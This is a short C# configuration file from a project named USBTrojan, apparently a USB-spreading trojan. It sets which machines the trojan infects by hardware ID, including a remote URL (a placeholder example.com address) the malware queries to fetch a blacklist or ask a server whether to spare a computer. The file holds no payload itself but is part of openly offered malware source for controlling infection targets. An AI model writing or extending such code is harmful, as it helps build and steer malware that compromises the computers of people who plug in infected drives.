using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace USBTrojan
{
    class Config
    {
        // * HWID Settings

        // If false trojan will infect all devices.
        public static bool HWID_Enabled = true;

        // Save calculated HWID to local storage
        public static bool HWID_Cache_Enabled = false;

        // HWID list or checker URL
        public static string HWID_List_URL = "https://example.com/USBTrojan/hwid/isInWhitelist?hwid={0}";

        // HWID Check mode, used HWID_List_URL
        // 0 - Download HWID blacklist (ignored computers) seperated with '\n'
        // 1 - Send a request to the server and check the HWID.
        //     If server returns 'good' trojan don't will infect computer.
        // 2 - Reserved :)
        public static int HWID_Mode = 1;
    }
}
